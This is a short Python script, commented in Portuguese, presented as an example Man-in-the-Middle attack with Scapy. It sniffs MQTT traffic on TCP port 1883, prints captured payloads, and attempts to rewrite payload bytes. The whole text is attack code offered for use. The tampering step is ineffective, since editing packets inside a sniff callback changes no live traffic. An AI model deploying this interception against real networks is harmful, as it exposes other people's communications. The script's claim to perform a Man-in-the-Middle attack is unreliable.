# Exemplo de um ataque Man-in-the-Middle (MitM) usando Scapy
from scapy.all import *

def mitm_packet(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            print("Packet Intercepted: " + packet[Raw].load.decode('utf-8'))
            # Substitua 'original' por 'modified', assumindo que ambos são strings UTF-8
            # Converta a string 'original' para bytes antes de substituir
            packet[Raw].load = packet[Raw].load.replace(b'original', b'modified')
        except UnicodeDecodeError:
            # Se não puder decodificar, imprime a representação em hexadecimal
            print("Packet Intercepted (hex): " + packet[Raw].load.hex())
    return packet

sniff(filter="tcp port 1883", prn=mitm_packet)
